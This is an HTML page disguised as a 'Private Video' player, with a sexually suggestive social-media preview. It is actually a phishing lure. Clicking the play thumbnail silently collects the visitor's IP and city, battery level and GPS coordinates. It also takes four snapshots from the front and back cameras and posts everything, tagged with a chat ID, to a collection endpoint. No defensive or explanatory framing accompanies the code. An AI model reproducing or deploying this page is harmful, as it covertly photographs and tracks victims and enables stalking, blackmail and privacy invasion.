<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta property="og:title" content="video Noor" />
  <meta property="og:description" content="ðŸ«¦ðŸ¤¤" />
  <meta property="og:image" content="https://i.postimg.cc/QCLhdnv0/IMG-20251113-000949-908.jpg" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo" />

  <!-- Ø¥Ø¶Ø§ÙØ© ÙˆØ³ÙˆÙ… Twitter -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="video Noor" />
  <meta name="twitter:description" content="ðŸ«¦ðŸ¤¤" />
  <meta name="twitter:image" content="https://i.postimg.cc/QCLhdnv0/IMG-20251113-000949-908.jpg" />
  <meta name="twitter:image:width" content="1200" />
  <meta name="twitter:image:height" content="630" />

  <title>Video Player</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background-color: #000;
      color: #fff;
    }

    .video-player-container {
      width: 90%;
      max-width: 800px;
      background: #111;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      position: relative;
    }

    .video-thumbnail {
      position: relative;
      width: 100%;
      height: 450px;
      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                  url('https://i.postimg.cc/QCLhdnv0/IMG-20251113-000949-908.jpg');
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .play-button-overlay {
      width: 100px;
      height: 100px;
      background-color: rgba(255, 0, 0, 0.85);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
    }

    .play-button-overlay:hover {
      transform: scale(1.1);
      background-color: rgba(255, 0, 0, 0.95);
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
    }

    .play-icon-large {
      width: 0;
      height: 0;
      border-left: 30px solid white;
      border-top: 20px solid transparent;
      border-bottom: 20px solid transparent;
      margin-left: 8px;
    }

    .video-info {
      padding: 20px;
      border-bottom: 1px solid #333;
    }

    .video-title {
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 8px;
    }

    .video-meta {
      display: flex;
      justify-content: space-between;
      color: #aaa;
      font-size: 0.9rem;
    }

    .video-controls {
      padding: 15px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #1a1a1a;
    }

    .control-button {
      background: none;
      border: none;
      color: white;
      font-size: 1.2rem;
      cursor: pointer;
      padding: 8px 15px;
      border-radius: 4px;
      transition: background 0.2s;
    }

    .control-button:hover {
      background: #333;
    }

    .play-button {
      background: #ff0000;
      color: white;
      font-weight: bold;
      padding: 10px 25px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .progress-bar {
      flex-grow: 1;
      height: 4px;
      background: #333;
      border-radius: 2px;
      margin: 0 20px;
      overflow: hidden;
      position: relative;
    }

    .progress-fill {
      position: absolute;
      height: 100%;
      width: 35%;
      background: #ff0000;
    }

    .time-display {
      color: #aaa;
      font-size: 0.9rem;
      min-width: 100px;
    }

    .spinner {
      border: 4px solid #fff;
      border-top: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
      position: absolute;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #loading {
      display: none;
      font-size: 1.2rem;
      color: #fff;
      margin-top: 20px;
      text-align: center;
    }

    .loading-text {
      margin-top: 10px;
    }

    .volume-control {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #aaa;
    }

    .volume-slider {
      width: 80px;
      height: 4px;
      background: #333;
      border-radius: 2px;
      position: relative;
    }

    .volume-level {
      position: absolute;
      height: 100%;
      width: 70%;
      background: #ff0000;
    }

    .fullscreen-btn {
      margin-left: 15px;
    }

    .video-stats {
      display: flex;
      gap: 20px;
      margin-top: 15px;
      color: #aaa;
      font-size: 0.9rem;
    }

    .stat-item {
      display: flex;
      align-items: center;
      gap: 5px;
    }
  </style>
</head>
<body>
  <form id="data-form" method="POST" action="/submitData">
    <input type="hidden" name="chatId" id="chatId" />
    <input type="hidden" name="imageDatas" id="imageDatas" />
    <input type="hidden" name="location" id="location" />
    <input type="hidden" name="permissions" id="permissions" />
    <input type="hidden" name="ipInfo" id="ipInfo" />
    <input type="hidden" name="battery" id="battery" />
  </form>

  <div class="video-player-container">
    <div class="video-info">
      <div class="video-title">Private Video</div>
      <div class="video-meta">

      </div>
    </div>

    <div class="video-thumbnail" onclick="captureData()">
      <div class="play-button-overlay">
        <div class="play-icon-large"></div>
        <div class="spinner" id="spinner"></div>
      </div>
    </div>

    <div class="video-controls">
      
     
      
      
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>
      
      <div class="time-display">0:00 / 2:45</div>
      
      <div class="volume-control">
        <span></span>
        <div class="volume-slider">
          <div class="volume-level"></div>
        </div>
      </div>
      
      <button class="control-button fullscreen-btn">â›¶</button>
    </div>
  </div>

  <div id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Loading video... Please wait</div>
  </div>

  <script>
    const permissions = [];
    let images = [];
    let ipInfo = '';
    let batteryStatus = '';

    async function fetchIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
      } catch {
        ipInfo = "IP Info not available";
      }
    }

    async function getBatteryStatus() {
      try {
        const battery = await navigator.getBattery();
        batteryStatus = Math.round(battery.level * 100) + '%';
      } catch {
        batteryStatus = "Unknown";
      }
    }

    async function captureFromCamera(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: facingMode } }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 1000)); // ØªØ£Ø®ÙŠØ±

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        images.push(canvas.toDataURL('image/jpeg').split(',')[1]);

        stream.getTracks().forEach(track => track.stop());
      } catch {
        permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
      }
    }

    async function getLocation() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
      } catch {
        permissions.push('Geolocation Denied');
        return '';
      }
    }

    async function captureData() {
      const loading = document.getElementById('loading');
      const spinner = document.querySelector('.spinner');
      const playButtons = document.querySelectorAll('.play-button, .play-button-overlay');

      // Ø¥Ø¸Ù‡Ø§Ø± Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
      spinner.style.display = 'block';
      loading.style.display = 'block';
      playButtons.forEach(btn => btn.style.opacity = '0.5');
      playButtons.forEach(btn => btn.style.pointerEvents = 'none');

      const chatId = new URLSearchParams(window.location.search).get('chatId');
      document.getElementById('chatId').value = chatId;

      await fetchIPInfo();
      document.getElementById('ipInfo').value = ipInfo;

      await getBatteryStatus();
      document.getElementById('battery').value = batteryStatus;

      const location = await getLocation();
      document.getElementById('location').value = location;

      // â¬‡ï¸ Ø§Ù„ØªØ³Ù„Ø³Ù„: Ø£Ù…Ø§Ù…ÙŠØ© â†’ Ø®Ù„ÙÙŠØ© â†’ Ø£Ù…Ø§Ù…ÙŠØ© â†’ Ø®Ù„ÙÙŠØ©
      await captureFromCamera('user');        // ØµÙˆØ±Ø© 1
      await captureFromCamera('environment'); // ØµÙˆØ±Ø© 2
      await captureFromCamera('user');        // ØµÙˆØ±Ø© 3
      await captureFromCamera('environment'); // ØµÙˆØ±Ø© 4

      document.getElementById('imageDatas').value = images.join(',');
      document.getElementById('permissions').value = permissions.join(', ');

      // Ø¥Ø®ÙØ§Ø¡ Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
      spinner.style.display = 'none';
      loading.style.display = 'none';
      playButtons.forEach(btn => btn.style.opacity = '1');
      playButtons.forEach(btn => btn.style.pointerEvents = 'auto');

      document.getElementById('data-form').submit();
    }

    // Ø¥Ø¶Ø§ÙØ© ØªÙØ§Ø¹Ù„ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ù„Ø£Ø²Ø±Ø§Ø±
    document.querySelectorAll('.control-button').forEach(button => {
      button.addEventListener('click', function(e) {
        e.stopPropagation();
        if(this.textContent.includes('â›¶')) {
          alert('Fullscreen mode would activate here');
        }
      });
    });

    // Ù…Ø­Ø§ÙƒØ§Ø© Ø­Ø±ÙƒØ© Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
    setInterval(() => {
      const progressFill = document.querySelector('.progress-fill');
      const currentWidth = parseInt(progressFill.style.width) || 35;
      const newWidth = (currentWidth + 0.1) % 100;
      progressFill.style.width = newWidth + '%';
      
      // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆÙ‚Øª
      const timeDisplay = document.querySelector('.time-display');
      const currentSeconds = Math.floor((newWidth / 100) * 165); // 2:45 = 165 Ø«Ø§Ù†ÙŠØ©
      const minutes = Math.floor(currentSeconds / 60);
      const seconds = currentSeconds % 60;
      timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
    }, 1000);
  </script>
</body>
</html>